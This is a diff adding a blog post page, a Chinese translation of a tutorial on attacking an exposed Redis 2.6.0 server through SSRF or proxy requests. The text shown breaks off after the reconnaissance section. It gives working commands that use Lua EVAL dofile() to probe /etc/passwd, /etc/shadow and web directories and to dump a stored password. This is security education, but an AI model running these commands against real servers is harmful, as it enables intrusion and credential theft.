@@ -1,0 +1,532 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 6.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.3.0/css/all.min.css" integrity="sha256-/4UQcSmErDzPCMAiuOiWPVVsNN2s3ZY/NsmXNcj0IFc=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-minimal.css">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous"></script>
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"fdlucifer.github.io","root":"/","images":"/images","scheme":"Muse","darkmode":true,"version":"8.15.0","exturl":true,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":true,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="环境想象一下，可以通过HTTP请求访问Redis服务器。这可能是SSRF漏洞或错误配置的代理。在这两种情况下，所需要的只是完全控制请求的至少一行。当然，CLI客户端’redisi-CLI’不支持HTTP代理，需要自己伪造命令，封装在有效的HTTP请求中，并通过代理发送。所有内容都在2.6.0版本下进行了测试。它很旧，但目标用的就是它……">
+<meta property="og:type" content="article">
+<meta property="og:title" content="通过http请求入侵redis">
+<meta property="og:url" content="https://fdlucifer.github.io/2020/12/19/Trying-to-hack-Redis-via-HTTP-requests/index.html">
+<meta property="og:site_name" content="lUc1f3r11&#39;s blog">
+<meta property="og:description" content="环境想象一下，可以通过HTTP请求访问Redis服务器。这可能是SSRF漏洞或错误配置的代理。在这两种情况下，所需要的只是完全控制请求的至少一行。当然，CLI客户端’redisi-CLI’不支持HTTP代理，需要自己伪造命令，封装在有效的HTTP请求中，并通过代理发送。所有内容都在2.6.0版本下进行了测试。它很旧，但目标用的就是它……">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2020-12-19T10:23:38.000Z">
+<meta property="article:modified_time" content="2020-12-19T11:57:18.664Z">
+<meta property="article:author" content="lUc1f3r11">
+<meta property="article:tag" content="hack redis">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="https://fdlucifer.github.io/2020/12/19/Trying-to-hack-Redis-via-HTTP-requests/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"https://fdlucifer.github.io/2020/12/19/Trying-to-hack-Redis-via-HTTP-requests/","path":"2020/12/19/Trying-to-hack-Redis-via-HTTP-requests/","title":"通过http请求入侵redis"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>通过http请求入侵redis | lUc1f3r11's blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">lUc1f3r11's blog</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">by lUc1f3r11</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="Search" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags<span class="badge">42</span></a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories<span class="badge">32</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives<span class="badge">203</span></a></li><li class="menu-item menu-item-schedule"><a href="/schedule/" rel="section"><i class="fa fa-calendar fa-fw"></i>Schedule</a></li><li class="menu-item menu-item-sitemap"><a href="/sitemap.xml" rel="section"><i class="fa fa-sitemap fa-fw"></i>Sitemap</a></li><li class="menu-item menu-item-commonweal"><a href="/404/" rel="section"><i class="fa fa-heartbeat fa-fw"></i>Commonweal 404</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83"><span class="nav-number">1.</span> <span class="nav-text">环境</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#redis-101"><span class="nav-number">2.</span> <span class="nav-text">redis 101</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%9B%AE%E6%A0%87%E8%AF%86%E5%88%AB"><span class="nav-number">3.</span> <span class="nav-text">目标识别</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9F%BA%E6%9C%AC%E4%BA%A4%E4%BA%92"><span class="nav-number">4.</span> <span class="nav-text">基本交互</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%9C%80%E8%A6%81%E7%A9%BA%E6%A0%BC"><span class="nav-number">5.</span> <span class="nav-text">需要空格</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BE%A6%E5%AF%9F"><span class="nav-number">6.</span> <span class="nav-text">侦察</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#cpu%E7%9B%97%E7%AA%83"><span class="nav-number">7.</span> <span class="nav-text">cpu盗窃</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#dos"><span class="nav-number">8.</span> <span class="nav-text">dos</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%95%B0%E6%8D%AE%E7%9B%97%E7%AA%83"><span class="nav-number">9.</span> <span class="nav-text">数据盗窃</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8A%A0%E5%AF%86"><span class="nav-number">10.</span> <span class="nav-text">加密</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#RCE"><span class="nav-number">11.</span> <span class="nav-text">RCE</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BB%93%E5%B0%BE%E9%83%A8%E5%88%86"><span class="nav-number">12.</span> <span class="nav-text">结尾部分</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BF%BB%E8%AF%91%E8%87%AA-%E5%B0%8A%E9%87%8D%E5%8E%9F%E4%BD%9C%E8%80%85%EF%BC%8C%E7%95%A5%E6%9C%89%E4%BF%AE%E6%94%B9"><span class="nav-number">13.</span> <span class="nav-text">翻译自(尊重原作者，略有修改)</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="lUc1f3r11"
+      src="/images/lucifer11.jpg">
+  <p class="site-author-name" itemprop="name">lUc1f3r11</p>
+  <div class="site-description" itemprop="description">All things about infosec & ctf</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">203</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">32</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">42</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;FDlucifer"><i class="fab fa-github fa-fw"></i>GitHub</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="bWFpbHRvOjExODUxNTE4NjdAcXEuY29t" title="E-Mail → mailto:1185151867@qq.com"><i class="fa fa-envelope fa-fw"></i>E-Mail</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly90d2l0dGVyLmNvbS9mZGx1Y2lmZXIxMQ==" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;fdlucifer11"><i class="fab fa-twitter fa-fw"></i>Twitter</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL3Byb2ZpbGUucGhwP2lkPTEwMDAxOTY5NDUyODYyMA==" title="FB Page → https:&#x2F;&#x2F;www.facebook.com&#x2F;profile.php?id&#x3D;100019694528620"><i class="fab fa-facebook fa-fw"></i>FB Page</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly93d3cueW91dHViZS5jb20vY2hhbm5lbC9VQ19saVRlaDRSMUZNYnBWeGxwTWUtdnc=" title="YouTube → https:&#x2F;&#x2F;www.youtube.com&#x2F;channel&#x2F;UC_liTeh4R1FMbpVxlpMe-vw"><i class="fab fa-youtube fa-fw"></i>YouTube</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly93d3cuaW5zdGFncmFtLmNvbS95YW5nODkyOS8=" title="Instagram → https:&#x2F;&#x2F;www.instagram.com&#x2F;yang8929&#x2F;"><i class="fab fa-instagram fa-fw"></i>Instagram</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly9pbmZvc2VjLmV4Y2hhbmdlL0BsVWMxZjNyMTE=" title="infosec.exchange → https:&#x2F;&#x2F;infosec.exchange&#x2F;@lUc1f3r11"><i class="custom mastodon fa-fw"></i>infosec.exchange</span>
+      </span>
+  </div>
+  <div class="cc-license animated" itemprop="license">
+    <span class="exturl cc-opacity" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/big/by_nc_sa.svg" alt="Creative Commons"></span>
+  </div>
+
+        </div>
+      </div>
+        <div class="back-to-top animated" role="button" aria-label="Back to top">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+    </div>
+
+    
+    <div class="sidebar-inner sidebar-blogroll">
+      <div class="links-of-blogroll animated">
+        <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
+          Links
+        </div>
+        <ul class="links-of-blogroll-list">
+            <li class="links-of-blogroll-item">
+              <span class="exturl" data-url="aHR0cHM6Ly9hdHN1ZDAubWUv" title="https:&#x2F;&#x2F;atsud0.me&#x2F;">atsud0</span>
+            </li>
+            <li class="links-of-blogroll-item">
+              <span class="exturl" data-url="aHR0cHM6Ly9kcm9pZGthbGkuZ2l0aHViLmlvLw==" title="https:&#x2F;&#x2F;droidkali.github.io&#x2F;">记忆里的纯真</span>
+            </li>
+            <li class="links-of-blogroll-item">
+              <span class="exturl" data-url="aHR0cHM6Ly94aWFvbGltYXJzLndvcmRwcmVzcy5jb20v" title="https:&#x2F;&#x2F;xiaolimars.wordpress.com&#x2F;">小离</span>
+            </li>
+        </ul>
+      </div>
+    </div>
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://fdlucifer.github.io/2020/12/19/Trying-to-hack-Redis-via-HTTP-requests/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/lucifer11.jpg">
+      <meta itemprop="name" content="lUc1f3r11">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="lUc1f3r11's blog">
+      <meta itemprop="description" content="All things about infosec & ctf">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="通过http请求入侵redis | lUc1f3r11's blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          通过http请求入侵redis
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+      
+
+      <time title="Created: 2020-12-19 18:23:38 / Modified: 19:57:18" itemprop="dateCreated datePublished" datetime="2020-12-19T18:23:38+08:00">2020-12-19</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/" itemprop="url" rel="index"><span itemprop="name">漏洞原理</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>想象一下，可以通过HTTP请求访问Redis服务器。这可能是SSRF漏洞或错误配置的代理。在这两种情况下，所需要的只是完全控制请求的至少一行。当然，CLI客户端’redisi-CLI’不支持HTTP代理，需要自己伪造命令，封装在有效的HTTP请求中，并通过代理发送。所有内容都在<span class="exturl" data-url="aHR0cDovL2NvZGUuZ29vZ2xlLmNvbS9wL3JlZGlzL2Rvd25sb2Fkcy9kZXRhaWw/bmFtZT1yZWRpcy0yLjYuMC50YXIuZ3o=">2.6.0版本<i class="fa fa-external-link-alt"></i></span>下进行了测试。它很旧，但目标用的就是它……</p>
+<span id="more"></span>
+
+<h2 id="redis-101"><a href="#redis-101" class="headerlink" title="redis 101"></a>redis 101</h2><p><span class="exturl" data-url="aHR0cDovL3JlZGlzLmlvLw==">Redis<i class="fa fa-external-link-alt"></i></span>是NoSQL数据库，它以键&#x2F;值对的形式存储在RAM中。默认情况下，可以在TCP&#x2F;6379端口上访问面向文本的接口，而不需要身份验证。现在需要知道的是接口是非常宽容的，它会尝试解析每个提供的输入(直到超时或’QUIT’命令)。它可能只会通过像“-ERR unknown command”这样的消息表达。</p>
+<h2 id="目标识别"><a href="#目标识别" class="headerlink" title="目标识别"></a>目标识别</h2><p>当利用SSRF漏洞或错误配置的代理时，第一个任务通常是扫描已知的服务。作为攻击者，只使用基于源的身份验证或仅仅是不安全的服务来寻找绑定到环回的服务，“因为它们从外部无法访问”。很高兴在日志中看到这些字符串:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">-ERR wrong number of arguments <span class="keyword">for</span> <span class="string">&#x27;get&#x27;</span> <span class="built_in">command</span></span><br><span class="line">-ERR unknown <span class="built_in">command</span> <span class="string">&#x27;Host:&#x27;</span></span><br><span class="line">-ERR unknown <span class="built_in">command</span> <span class="string">&#x27;Accept:&#x27;</span></span><br><span class="line">-ERR unknown <span class="built_in">command</span> <span class="string">&#x27;Accept-Encoding:&#x27;</span></span><br><span class="line">-ERR unknown <span class="built_in">command</span> <span class="string">&#x27;Via:&#x27;</span></span><br><span class="line">-ERR unknown <span class="built_in">command</span> <span class="string">&#x27;Cache-Control:&#x27;</span></span><br><span class="line">-ERR unknown <span class="built_in">command</span> <span class="string">&#x27;Connection:&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>正如看到的，HTTP动词’GET’也是一个<span class="exturl" data-url="aHR0cHM6Ly9yZWRpcy5pby9jb21tYW5kcy9HRVQ=">有效<i class="fa fa-external-link-alt"></i></span>的Redis命令，但参数的数量不匹配。如果没有HTTP报头匹配现有Redis命令，则会出现大量“未知命令”错误消息。</p>
+<h2 id="基本交互"><a href="#基本交互" class="headerlink" title="基本交互"></a>基本交互</h2><p>在我的环境中，请求几乎完全由自己控制，然后通过Squid代理发出。这意味着</p>
+<p>1)HTTP请求必须是有效的，以便被代理处理</p>
+<p>2)到达Redis数据库的最终请求可能会被代理规范化。最简单的方法是使用POST主体，但注入到HTTP头中也是一个有效的选择。</p>
+<p>现在，只发送一些基本的命令:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">ECHO HELLO</span><br><span class="line"><span class="variable">$5</span></span><br><span class="line">HELLO</span><br><span class="line"></span><br><span class="line">TIME</span><br><span class="line">*2</span><br><span class="line"><span class="variable">$10</span></span><br><span class="line">1410273409</span><br><span class="line"><span class="variable">$6</span></span><br><span class="line">380112</span><br><span class="line"></span><br><span class="line">CONFIG GET pidfile</span><br><span class="line">*2</span><br><span class="line"><span class="variable">$7</span></span><br><span class="line">pidfile</span><br><span class="line"><span class="variable">$18</span></span><br><span class="line">/var/run/redis.pid</span><br><span class="line"></span><br><span class="line">SET my_key my_value</span><br><span class="line">+OK</span><br><span class="line"></span><br><span class="line">GET my_key</span><br><span class="line"><span class="variable">$8</span></span><br><span class="line">my_value</span><br><span class="line"></span><br><span class="line">QUIT</span><br><span class="line">+OK</span><br></pre></td></tr></table></figure>
+
+<h2 id="需要空格"><a href="#需要空格" class="headerlink" title="需要空格"></a>需要空格</h2><p>可能已经注意到，服务器用预期的数据以及一些字符串(如“*2”和“$7”)进行响应。这是二进制安全版本的Redis协议，如果想使用包含空格的参数，它是必需的。例如，命令’SET my key “foo bar”将永远不会工作，带或不带单引号&#x2F;双引号。幸运的是，二进制安全版本非常简单:</p>
+<ul>
+<li>所有内容都用新行分隔(这里是CRLF)</li>
+<li>命令以“<em>”开头，参数个数(“</em>1” + CRLF)</li>
+<li>然后有论点，一个接一个:<ul>
+<li>string: ‘$’字符 + 字符串大小(“$4” + CRLF) + 字符串值(“TIME” + CRLF)</li>
+<li>integer: ‘:’字符 + ASCII中的整数(“:42” + CRLF)</li>
+</ul>
+</li>
+<li>就这些!</li>
+</ul>
+<p>现在看一个例子，比较CLI客户端和古老的’netcat’:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ redis-cli -h 127.0.0.1 -p 6379 <span class="built_in">set</span> with_space <span class="string">&#x27;I am boring&#x27;</span></span><br><span class="line">+OK</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">echo</span> <span class="string">&#x27;*3\r\n$3\r\nSET\r\n$10\r\nwith_space\r\n$11\r\nI am boring\r\n&#x27;</span> | nc -n -q 1 127.0.0.1 6379 </span><br><span class="line">+OK</span><br></pre></td></tr></table></figure>
+
+<h2 id="侦察"><a href="#侦察" class="headerlink" title="侦察"></a>侦察</h2><p>可以轻松地与服务器进行交互，那么就需要一个侦查阶段。一些Redis命令是有帮助的，如”INFO”和”CONFIG GET (dir|dbfilename|logfile|pidfile)”。这是输出的“INFO”在测试机器:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Server</span></span><br><span class="line">redis_version:2.6.0</span><br><span class="line">redis_git_sha1:00000000</span><br><span class="line">redis_git_dirty:0</span><br><span class="line">redis_mode:standalone</span><br><span class="line">os:Linux 3.2.0-61-generic-pae i686</span><br><span class="line">arch_bits:32</span><br><span class="line">multiplexing_api:epoll</span><br><span class="line">gcc_version:4.6.3</span><br><span class="line">process_id:19114</span><br><span class="line">run_id:5a29a860ccbe05b43dbe15c0674fb83df0449b25</span><br><span class="line">tcp_port:6379</span><br><span class="line">uptime_in_seconds:9806</span><br><span class="line">uptime_in_days:0</span><br><span class="line">lru_clock:518932</span><br><span class="line"></span><br><span class="line"><span class="comment"># Clients</span></span><br><span class="line">connected_clients:1</span><br><span class="line">client_longest_output_list:0</span><br><span class="line">client_biggest_input_buf:1</span><br><span class="line">blocked_clients:0</span><br><span class="line"></span><br><span class="line"><span class="comment"># Memory</span></span><br><span class="line">used_memory:661768</span><br><span class="line">[...]</span><br></pre></td></tr></table></figure>
+
+<p>下一步是文件系统。Redis可以通过“EVAL”命令执行Lua脚本(在沙箱中，稍后会详细介绍)。沙箱允许<span class="exturl" data-url="aHR0cDovL2x1YXR1dC5jb20vZG9maWxlLmh0bWw=">dofile()<i class="fa fa-external-link-alt"></i></span>命令(为什么??)它可以用来枚举文件和目录。Redis不需要特殊的权限，所以请求&#x2F;etc&#x2F;shadow应该给出一个“permission denied”错误消息:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">EVAL dofile(<span class="string">&#x27;/etc/passwd&#x27;</span>) 0</span><br><span class="line">-ERR Error running script (call to f_afdc51b5f9e34eced5fae459fc1d856af181aaf1): /etc/passwd:1: <span class="keyword">function</span> arguments expected near <span class="string">&#x27;:&#x27;</span> </span><br><span class="line"></span><br><span class="line">EVAL dofile(<span class="string">&#x27;/etc/shadow&#x27;</span>) 0</span><br><span class="line">-ERR Error running script (call to f_9882e931901da86df9ae164705931dde018552cb): cannot open /etc/shadow: Permission denied</span><br><span class="line"></span><br><span class="line">EVAL dofile(<span class="string">&#x27;/var/www/&#x27;</span>) 0</span><br><span class="line">-ERR Error running script (call to f_8313d384df3ee98ed965706f61fc28dcffe81f23): cannot <span class="built_in">read</span> /var/www/: Is a directory</span><br><span class="line"></span><br><span class="line">EVAL dofile(<span class="string">&#x27;/var/www/tmp_upload/&#x27;</span>) 0</span><br><span class="line">-ERR Error running script (call to f_7acae0314580c07e65af001d53ccab85b9ad73b1): cannot open /var/www/tmp_upload/: No such file or directory</span><br><span class="line"></span><br><span class="line">EVAL dofile(<span class="string">&#x27;/home/ubuntu/.bashrc&#x27;</span>) 0</span><br><span class="line">-ERR Error running script (call to f_274aea5728cae2627f7aac34e466835e7ec570d2): /home/ubuntu/.bashrc:2: unexpected symbol near <span class="string">&#x27;#&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>如果Lua脚本语法无效或试图设置全局变量，错误消息将泄漏目标文件的一些内容:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">EVAL dofile(<span class="string">&#x27;/etc/issue&#x27;</span>) 0</span><br><span class="line">-ERR Error running script (call to f_8a4872e08ffe0c2c5eda1751de819afe587ef07a): /etc/issue:1: malformed number near <span class="string">&#x27;12.04.4&#x27;</span></span><br><span class="line"></span><br><span class="line">EVAL dofile(<span class="string">&#x27;/etc/lsb-release&#x27;</span>) 0</span><br><span class="line">-ERR Error running script (call to f_d486d29ccf27cca592a28676eba9fa49c0a02f08): /etc/lsb-release:1: Script attempted to access unexisting global variable <span class="string">&#x27;Ubuntu&#x27;</span></span><br><span class="line"></span><br><span class="line">EVAL dofile(<span class="string">&#x27;/etc/hosts&#x27;</span>) 0</span><br><span class="line">-ERR Error running script (call to f_1c25ec3da3cade16a36d3873a44663df284f4f57): /etc/hosts:1: malformed number near <span class="string">&#x27;127.0.0.1&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>另一种情况(可能不太常见)是在有效的Lua文件上调用dofile()，并返回在那里定义的变量。这是一个假设文件&#x2F;var&#x2F;data&#x2F;app&#x2F;db.conf:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">db = &#123;</span><br><span class="line">   login  = <span class="string">&#x27;john.doe&#x27;</span>,</span><br><span class="line">   passwd = <span class="string">&#x27;Uber31337&#x27;</span>,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>和一个小Lua脚本转储密码:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">EVAL dofile(<span class="string">&#x27;/var/data/app/db.conf&#x27;</span>);<span class="built_in">return</span>(db.passwd); 0 </span><br><span class="line">+OK Uber31337</span><br></pre></td></tr></table></figure>
+
+<p>也适用于一些标准的Unix文件:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">EVAL dofile(<span class="string">&#x27;/etc/environment&#x27;</span>);<span class="built_in">return</span>(PATH); 0       </span><br><span class="line">+OK /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games</span><br><span class="line"></span><br><span class="line">EVAL dofile(<span class="string">&#x27;/home/ubuntu/.selected_editor&#x27;</span>);<span class="built_in">return</span>(SELECTED_EDITOR); 0</span><br><span class="line">+OK /usr/bin/nano</span><br></pre></td></tr></table></figure>
+
